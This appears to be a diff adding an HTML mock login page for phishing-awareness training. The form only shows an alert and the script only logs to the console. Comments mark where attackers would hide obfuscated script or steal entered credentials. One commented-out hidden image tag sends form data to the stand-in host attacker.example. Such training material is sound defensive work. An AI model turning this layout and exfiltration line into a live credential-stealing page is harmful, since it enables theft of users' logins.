@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Demo Malicious Page (Safe Example)</title>
+
+  <!-- Example of where an attacker MIGHT put obfuscated JS -->
+  <!-- <script> ... malicious payload here ... </script> -->
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: #eee;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: #222;
+      padding: 20px 30px;
+      border-radius: 8px;
+      max-width: 400px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .warning {
+      color: #ffcc00;
+      margin-bottom: 10px;
+      font-size: 14px;
+    }
+    label {
+      display: block;
+      margin-top: 10px;
+    }
+    input {
+      width: 100%;
+      padding: 8px;
+      margin-top: 4px;
+      border-radius: 4px;
+      border: 1px solid #444;
+      background: #111;
+      color: #eee;
+      box-sizing: border-box;
+    }
+    button {
+      margin-top: 15px;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    /* In a real attack this might try to visually imitate a brand */
+    button.primary {
+      background: #555;
+      color: #eee;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Demo Login Page</h2>
+    <p class="warning">
+      ⚠ This is a SAFE training example. Do NOT enter real credentials.
+    </p>
+
+    <!-- In a real malicious page, attackers might steal these values.
+         Here we do NOTHING with them. -->
+    <form onsubmit="alert('Training only. No data is sent.'); return false;">
+      <label for="user">Username</label>
+      <input id="user" name="user" type="text" autocomplete="off" />
+
+      <label for="pass">Password</label>
+      <input id="pass" name="pass" type="password" autocomplete="off" />
+
+      <button class="primary" type="submit">
+        Sign In (Training Demo)
+      </button>
+    </form>
+
+    <!-- Example placeholder where tracking / exfil code might go:
+    <img src="https://attacker.example/collect?data=..." style="display:none" />
+    -->
+
+  </div>
+
+  <!-- Another placeholder for a script that could be abused.
+       The function below does nothing harmful. -->
+  <script>
+    // SAFE placeholder: just logs to console
+    console.log("This is a safe training demo. No malicious behavior here.");
+  </script>
+</body>
+</html>
